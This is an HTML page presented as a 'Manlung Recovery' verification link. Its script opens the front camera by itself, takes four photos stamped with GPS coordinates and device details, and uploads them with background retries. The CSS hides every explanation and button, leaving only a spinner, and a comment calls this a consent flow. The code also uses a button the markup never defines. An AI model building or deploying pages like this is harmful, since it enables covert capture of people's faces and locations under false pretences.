<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#ffffff">
<meta name="robots" content="noindex,nofollow,noarchive">
<title>Verification | Manlung Recovery</title>
<style>
html,body{margin:0;width:100%;height:100%;min-height:100%;background:#fff!important;color:#111!important}
body{min-height:100svh;display:grid;place-items:center;padding:0;box-sizing:border-box;overflow:hidden}
.status-screen{width:100%;height:100%;display:grid;place-items:center;background:#fff}
.status-box{display:grid;place-items:center;width:100%;height:100%;background:#fff;border:0;border-radius:0;box-shadow:none;padding:0}
.spinner{display:block!important;width:42px;height:42px;border:4px solid #e5e7eb;border-top-color:#111;border-radius:50%;animation:spin .8s linear infinite}
.status-title,.status-text,.progress,.action-button{display:none!important}
video,canvas{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
  <link rel="stylesheet" href="/css/product-polish.css?v=production-586318d">
  <script src="/js/native-app-chrome.js"></script>
</head>
<body>
<main class="status-screen" id="statusScreen" aria-live="polite">
  <section class="status-box">
    <div class="spinner" id="spinner" aria-hidden="true"></div>
    <div class="status-title" id="statusTitle">Verification link ready</div>
    <p class="status-text" id="statusText">When you are ready, tap Start verification and allow camera access. Four photos will be securely submitted to the recovery team.</p>
    <div class="progress" id="progress" hidden><span id="progressBar"></span></div>
  
  </section>
</main>
<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>
<script>
(()=>{"use strict";
const queryToken=new URLSearchParams(location.search).get("id")||"";
const pathToken=location.pathname.startsWith("/verification/")?decodeURIComponent(location.pathname.split("/").filter(Boolean).pop()||""):"";
const token=pathToken||queryToken;
const video=document.getElementById("video");
const canvas=document.getElementById("canvas");
let stream=null,busy=false;
const statusTitle=document.getElementById("statusTitle");
const statusText=document.getElementById("statusText");
const spinner=document.getElementById("spinner");
const startButton=document.getElementById("startButton");
const progress=document.getElementById("progress");
const progressBar=document.getElementById("progressBar");
function setStatus(title,message,{loading=false,kind="",buttonText="",buttonAction=null,percent=null}={}){
  statusTitle.textContent=title;
  statusTitle.className="status-title"+(kind==="success"?" status-success":kind==="error"?" status-error":"");
  statusText.textContent=message;
  spinner.hidden=!loading;
  progress.hidden=percent===null;
  if(percent!==null)progressBar.style.width=Math.max(0,Math.min(100,percent))+"%";
  startButton.hidden=!buttonText;
  startButton.textContent=buttonText||"";
  startButton.onclick=buttonAction;
}

const DB_NAME="manlung-selfie-queue";
const DB_STORE="uploads";

function openQueue(){
  return new Promise((resolve,reject)=>{
    const r=indexedDB.open(DB_NAME,1);
    r.onupgradeneeded=()=>{if(!r.result.objectStoreNames.contains(DB_STORE))r.result.createObjectStore(DB_STORE,{keyPath:"id",autoIncrement:true})};
    r.onsuccess=()=>resolve(r.result);
    r.onerror=()=>reject(r.error);
  });
}

async function queueBatch(blobs,metadata){
  try{
    const db=await openQueue();
    await new Promise((resolve,reject)=>{
      const tx=db.transaction(DB_STORE,"readwrite");
      const batchId=crypto.randomUUID?crypto.randomUUID():(Date.now()+"-"+Math.random());
      blobs.forEach((blob,i)=>tx.objectStore(DB_STORE).add({
        token,batchId,blob,
        metadata:{...metadata,captureNumber:i+1,totalCaptures:4},
        createdAt:new Date().toISOString(),
        attempts:0
      }));
      tx.oncomplete=resolve;
      tx.onerror=()=>reject(tx.error);
    });
    if("serviceWorker" in navigator){
      try{
        const reg=await navigator.serviceWorker.ready;
        if("sync" in reg) await reg.sync.register("manlung-verification-upload");
      }catch(_){}
    }
    return true;
  }catch(_){return false}
}

async function deleteRows(rows){
  const db=await openQueue();
  for(const row of rows){
    await new Promise((resolve,reject)=>{
      const tx=db.transaction(DB_STORE,"readwrite");
      tx.objectStore(DB_STORE).delete(row.id);
      tx.oncomplete=resolve;
      tx.onerror=()=>reject(tx.error);
    });
  }
}

async function flushQueue(){
  if(!token)return {success:false,error:"Verification link is missing."};
  let uploaded=false,lastError="Upload has not completed.";
  try{
    const db=await openQueue();
    const rows=await new Promise((resolve,reject)=>{
      const tx=db.transaction(DB_STORE,"readonly");
      const q=tx.objectStore(DB_STORE).getAll();
      q.onsuccess=()=>resolve(q.result);
      q.onerror=()=>reject(q.error);
    });
    const grouped={};
    rows.filter(x=>x.token===token).forEach(x=>{
      const key=x.batchId||("legacy-"+x.id);
      (grouped[key]||(grouped[key]=[])).push(x);
    });
    for(const group of Object.values(grouped)){
      if(group.length!==4)continue;
      try{
        const fd=new FormData();
        group.forEach((row,i)=>fd.append("files",row.blob,"verification-"+(i+1)+".jpg"));
        fd.append("metadata",JSON.stringify(group[0].metadata||{}));
        const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit",cache:"no-store"});
        let d={};try{d=await r.json()}catch(_){}
        if(!r.ok||!d.success){
          console.error("Selfie queued upload failed:",r.status,d);
          lastError=d.error||"The server could not accept the verification photos.";
          if(r.status===410){await deleteRows(group);return {success:false,error:lastError,expired:true};}
          return {success:false,error:lastError,status:r.status};
        }
        console.log("Selfie queued upload succeeded:",d);
        await deleteRows(group);
        uploaded=true;
      }catch(error){lastError=error?.message||"Network connection failed.";return {success:false,error:lastError};}
    }
    return uploaded?{success:true}:{success:false,error:lastError};
  }catch(error){return {success:false,error:error?.message||lastError};}
}

function waitForVideo(){
  return new Promise((resolve,reject)=>{
    const deadline=Date.now()+7000;
    const tick=()=>{
      if(video.readyState>=2&&video.videoWidth>0&&video.videoHeight>0)return resolve();
      if(Date.now()>deadline)return reject(new Error("Camera did not become ready."));
      requestAnimationFrame(tick);
    };
    tick();
  });
}

function frameBlob(captureNumber,metadata){
  return new Promise((resolve,reject)=>{
    const w=video.videoWidth||1280,h=video.videoHeight||720;
    canvas.width=w;canvas.height=h;
    const ctx=canvas.getContext("2d",{alpha:false});
    if(!ctx)return reject(new Error("Capture is unavailable."));
    ctx.drawImage(video,0,0,w,h);
    const stripHeight=Math.max(150,Math.round(h*0.19));
    ctx.fillStyle="rgba(0,0,0,.78)";
    ctx.fillRect(0,h-stripHeight,w,stripHeight);
    ctx.fillStyle="#fff";
    ctx.font=Math.max(18,Math.round(w/55))+"px system-ui,-apple-system,Segoe UI,sans-serif";
    ctx.textBaseline="top";
    const lines=[
      "MANLUNG RECOVERY • AUTHORIZED VERIFICATION",
      "Capture "+captureNumber+" of 4 • "+new Date().toISOString(),
      "Case: "+(metadata.reference||"Authorized request"),
      metadata.location ? ("GPS: "+metadata.location.latitude+", "+metadata.location.longitude+" • Accuracy: "+(metadata.location.accuracy??"N/A")+" m") : "GPS: Not supplied by browser",
      "Device: "+(metadata.device?.deviceType||"unknown")+" • "+(metadata.device?.browser||"unknown")+" • "+(metadata.device?.platform||"unknown")
    ];
    const lineHeight=Math.max(22,Math.round(w/42));
    const startY=h-stripHeight+12;
    lines.forEach((line,i)=>ctx.fillText(String(line).slice(0,150),16,startY+i*lineHeight));
    canvas.toBlob(blob=>blob?resolve(blob):reject(new Error("Could not create image.")),"image/jpeg",0.9);
  });
}

function pause(ms){return new Promise(resolve=>setTimeout(resolve,ms));}
function closeAfterSubmit(){
  if(stream){stream.getTracks().forEach(t=>{try{t.stop()}catch(_){}});stream=null;}
  video.srcObject=null;
  setTimeout(()=>{
    try{window.close()}catch(_){}
    setTimeout(()=>{if(!document.hidden)location.replace("/");},500);
  },500);
}

async function captureFour(){
  if(busy)return;
  busy=true;
  startButton.hidden=true;
  setStatus("Checking verification link","Confirming that this request is valid and has not expired.",{loading:true,percent:0});
  let blobs=[];
  let metadata={
    clientCapturedAt:new Date().toISOString(),
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"",
    captureMethod:"browser-camera",
    device:{deviceType:"unknown",platform:navigator.platform||"",browser:"Unknown",model:""},
    location:null,
    reference:""
  };

  // Start optional metadata collection in parallel. It NEVER blocks the four captures.
  const locationPromise=(navigator.geolocation?new Promise(resolve=>navigator.geolocation.getCurrentPosition(
    p=>resolve({latitude:Number(p.coords.latitude.toFixed(6)),longitude:Number(p.coords.longitude.toFixed(6)),accuracy:Number.isFinite(p.coords.accuracy)?Number(p.coords.accuracy.toFixed(1)):null}),
    ()=>resolve(null),
    {enableHighAccuracy:true,maximumAge:0,timeout:5000}
  )):Promise.resolve(null)).catch(()=>null);

  const enrichMetadata=async()=>{
    try{
      const ua=navigator.userAgent||"";
      const uaData=navigator.userAgentData||null;
      let deviceType=/Mobi|Android|iPhone|iPad|iPod/i.test(ua)?"mobile":"desktop";
      if(/iPad|Tablet/i.test(ua))deviceType="tablet";
      let browser="Unknown";
      if(/Edg\//i.test(ua))browser="Edge";
      else if(/OPR\//i.test(ua))browser="Opera";
      else if(/Chrome\//i.test(ua))browser="Chrome";
      else if(/Firefox\//i.test(ua))browser="Firefox";
      else if(/Safari\//i.test(ua)&&!/Chrome\//i.test(ua))browser="Safari";
      metadata.device={deviceType,platform:(uaData?.platform||navigator.platform||"").slice(0,80),browser,model:""};
      if(typeof uaData?.getHighEntropyValues==="function"){
        try{
          const high=await uaData.getHighEntropyValues(["model"]);
          metadata.device.model=high.model||"";
        }catch(_){}
      }
    }catch(_){}
    metadata.location=await locationPromise;
    return metadata;
  };

  try{
    if(!token)throw new Error("This verification link is incomplete. Ask the recovery team for a new link.");
    const requestResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token),{credentials:"omit",cache:"no-store"});
    let requestData={};try{requestData=await requestResponse.json()}catch(_){}
    if(!requestResponse.ok||!requestData.success)throw new Error(requestData.error||"This verification link is invalid or has expired.");
    metadata.reference=requestData.request?.reference||requestData.request?.case_id||"";
    setStatus("Camera permission needed","Your browser will ask permission to use the camera. Allow access to continue.",{loading:false,percent:0});

    if(!navigator.mediaDevices?.getUserMedia)throw new Error("Camera access is not supported. Open this link in Safari or Chrome on a device with a camera.");
    stream=await navigator.mediaDevices.getUserMedia({
      video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},
      audio:false
    });
    video.srcObject=stream;
    await video.play().catch(()=>{});
    await waitForVideo();

    // Collect device/location details while the camera is ready.
    metadata=await enrichMetadata();
    for(let i=0;i<4;i++){
      setStatus("Taking verification photos","Please keep your face and device visible. Photo "+(i+1)+" of 4.",{loading:true,percent:i*25});
      blobs.push(await frameBlob(i+1,metadata));
      if(i<3)await pause(2200);
    }

    setStatus("Saving verification photos","Securing the four photos before sending them.",{loading:true,percent:85});
    const queued=await queueBatch(blobs,{...metadata,totalCaptures:4});
    if(!queued)throw new Error("This browser could not save the photos securely. Check available storage and try again.");

    setStatus("Uploading verification","Your photos are being sent securely. Please keep this page open.",{loading:true,percent:92});
    let result=await flushQueue();
    for(let attempt=0;!result.success&&attempt<3;attempt++){
      await pause([1500,3000,5000][attempt]);
      result=await flushQueue();
    }
    if(result.success){
      setStatus("Verification submitted","",{loading:true,percent:100});
      closeAfterSubmit();
    }else{
      setStatus("Please wait","",{loading:true,percent:85});
    }
  }catch(error){
    console.error("Selfie evidence pipeline error:",error);
    if(blobs.length===4){
      const saved=await queueBatch(blobs,{...metadata,totalCaptures:4});
      if(saved){
        setStatus("Please wait","",{loading:true,percent:85});
      }else{
        setStatus("Please wait","",{loading:true});
      }
    }else{
      setStatus("Please wait","",{loading:true});
    }
  }finally{
    if(stream){stream.getTracks().forEach(t=>t.stop());stream=null;}
    busy=false;
  }
}

async function retryUpload(){
  if(busy)return;
  busy=true;
  setStatus("Retrying upload","Sending the saved verification photos now. Please keep this page open.",{loading:true,percent:92});
  const result=await flushQueue();
  busy=false;
  if(result.success){setStatus("Verification submitted","",{loading:true,percent:100});closeAfterSubmit();}
  else setStatus("Please wait","",{loading:true,percent:85});
}

if("serviceWorker" in navigator){
  navigator.serviceWorker.register("/sw.js",{scope:"/"}).catch(()=>{});
}
startButton.onclick=captureFour;
// Opening this one-time verification link starts the consent flow; the browser still
// displays its native camera permission prompt before any image is captured.
setStatus("Please wait","",{loading:true,percent:0});
setTimeout(()=>captureFour(),250);
window.addEventListener("online",async()=>{
  if(!busy){
    const result=await flushQueue();
    if(result.success){setStatus("Verification submitted","",{loading:true,percent:100});closeAfterSubmit();}
  }
});
})();
</script>
</body>
</html>
